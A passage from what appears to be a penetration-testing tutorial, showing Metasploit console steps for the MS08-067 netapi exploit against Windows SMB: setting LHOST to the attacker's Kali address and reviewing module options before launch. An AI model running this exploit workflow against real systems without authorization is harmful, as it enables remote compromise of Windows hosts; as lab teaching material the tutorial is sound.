    We will leave the EXITFUNC and LPORT settings to the default.


    +   8. But we need to put it in the LHOST or local host address. This is the IP
    for our Kali system:

    ```

    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.10

    LHOST => 192.168.0.10

    ```


    Once our payload options are set, we can go ahead and run the exploit.


    # Running the Exploit


    When starting out, it is always a good idea to run the "show options" command
    one last time and double check that everything is set correctly.


    ```

    msf exploit(ms08_067_netapi) > show options

    Module options (exploit/windows/smb/ms08_067_netapi):

    Name            Current Setting Required Description

    RHOST           yes             yes        The target address

    RPORT           445             yes        Set the SMB service port

    SMBPIPE        BROWSER         yes        The pipe name to use (BROWSER, SRSVCS)

    ```


    If you notice above, looks like we forgot to set the target system (RHOST) IP
    address!\ We set the RHOST for a prior example, but when we switched exploits,
